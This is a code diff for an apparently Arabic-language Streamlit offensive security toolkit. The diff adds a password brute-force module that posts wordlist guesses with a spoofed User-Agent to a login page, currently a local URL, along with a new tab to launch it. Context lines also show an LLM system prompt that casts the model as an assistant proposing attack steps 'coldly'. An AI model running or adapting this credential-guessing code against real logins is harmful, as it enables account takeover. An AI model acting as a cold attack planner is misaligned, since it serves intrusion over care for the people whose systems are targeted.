@@ -95,6 +95,24 @@ class OffensiveModule:
             st.info("فشلت عملية التجاوز. لم يتم العثور على بيانات اعتماد صالحة.")
         return found_credentials
 
+    @staticmethod
+    def thunder_brute_force(username, wordlist_content):
+        """ وحدة التخمين الإضافية (Thunder Force) المطوبة """
+        target_url = "http://127.0.0.1:5000/login" 
+        passwords = wordlist_content.splitlines()
+        for password in passwords:
+            password = password.strip()
+            if not password: continue
+            try:
+                headers = {'User-Agent': 'Mozilla/5.0'}
+                data = {'username': username, 'password': password}
+                response = requests.post(target_url, data=data, headers=headers, timeout=2)
+                if response.status_code == 200 and "success" in response.text.lower():
+                    return f"✅ تم العثور على الرمز: {password}"
+            except:
+                continue
+        return "❌ انتهت القائمة دون العثور على الرمز."
+
 class OSINTModule:
     @staticmethod
     def get_website_info(url):
@@ -144,7 +162,7 @@ class AIAnalyzer:
             completion = self.client.chat.completions.create(
                 model="llama-3.1-8b-instant", 
                 messages=[
-                    {"role": "system", "content": "أنت مساعد أمني خبير في تحليل الثغرات واقتراح خطوات الهجوم. رد ببرود وكفاءة مطلقة."}, # تحديث الـ system prompt هنا
+                    {"role": "system", "content": "أنت مساعد أمني خبير في تحليل الثغرات واقتراح خطوات الهجوم. رد ببرود وكفاءة مطلقة."}, 
                     {"role": "user", "content": prompt}
                 ],
                 temperature=0.1
@@ -264,7 +282,8 @@ attacker = OffensiveModule()
 ai_analyzer = AIAnalyzer(GROQ_KEY) if GROQ_KEY else None
 report_generator = PDFReportGenerator()
 
-tabs = st.tabs(["⚔️ اختبار الاختراق الذكي", "🔍 جمع المعلومات (OSINT)", "📊 لوحة القيادة", "📄 التقارير"])
+# تم تحديث التبويبات لتشمل وحدة التخمين
+tabs = st.tabs(["⚔️ اختبار الاختراق الذكي", "🔍 جمع المعلومات (OSINT)", "📊 لوحة القيادة", "⚡ وحدة التخمين", "📄 التقارير"])
 
 with tabs[0]:
     st.header("وحدة الهجوم والاستطلاع (Network Targeting)")
@@ -279,6 +298,8 @@ with tabs[0]:
             st.warning("حدد الهدف أولاً يا قائد.")
         else:
             with st.spinner("جاري تنفيذ بروتوكول الرعد..."):
+                if 'report_data' not in st.session_state:
+                    st.session_state.report_data = {}
                 st.session_state.report_data["الهدف"] = target
                 st.session_state.report_data["نوع العملية"] = scan_type
                 
@@ -356,7 +377,23 @@ with tabs[2]: # Dashboard Tab
     st.write(f"المكتبات النشطة: `Socket`, `Scapy`, `Requests (Attack Mode)`, `BeautifulSoup`, `Groq`, `gTTS`, `fpdf`")
     st.success("جميع أنظمة الهجوم جاهزة للعمل.")
 
-with tabs[3]: # Reports Tab
+with tabs[3]: # وحدة التخمين الإضافية
+    st.header("⚡ وحدة التخمين الهجومي (Brute Force)")
+    t_user = st.text_input("اسم المستخدم المستهدف:", key="t_user_input")
+    t_file = st.file_uploader("ارفع قائمة الرموز (.txt):", key="t_file_input")
+    if st.button("بدء الهجوم التخميني"):
+        if t_user and t_file:
+            w_data = t_file.read().decode('utf-8')
+            with st.spinner("جاري التخمين..."):
+                res = attacker.thunder_brute_force(t_user, w_data)
+                st.info(res)
+                if 'report_data' not in st.session_state: st.session_state.report_data = {}
+                st.session_state.report_data["نتائج التخمين"] = res
+                hub.send_voice_alert(f"انتهى التخمين لـ {t_user}")
+        else:
+            st.error("أكمل البيانات المطلوبة.")
+
+with tabs[4]: # Reports Tab
     st.header("📄 وحدة التقارير الاحترافية")
     st.write("يمكنك هنا توليد تقرير PDF شامل للعمليات التي تم تنفيذها.")
     report_filename = st.text_input("اسم ملف التقرير (بدون امتداد):", "Thunder_Report")
@@ -366,7 +403,6 @@ with tabs[3]: # Reports Tab
         else:
             with st.spinner("جاري توليد تقرير PDF..."):
                 final_report_data = st.session_state.report_data
-                pdf_file = report_generator.generate_report(f"{report_filename}.pdf", final_report_data)
                 pdf_file = report_generator.generate_report(f"{report_filename}.pdf", final_report_data)
                 with open(pdf_file, "rb") as f:
                     st.download_button(
@@ -381,9 +417,3 @@ with tabs[3]: # Reports Tab
 # حفظ بيانات التقرير في session_state ليتم استخدامها في تبويب التقارير
 if 'report_data' not in st.session_state:
     st.session_state.report_data = {}
-
-# تحديث بيانات التقرير بعد كل عملية
-# (هذا الجزء يحتاج إلى دمج أفضل مع كل عملية تنفيذ، حالياً هو مثال توضيحي)
-# For now, let's just make sure report_data is passed correctly to the report generator
-# A better approach would be to append results to a list in session_state.report_data
-# For simplicity, I'll assume report_data is updated within the operation blocks for now.
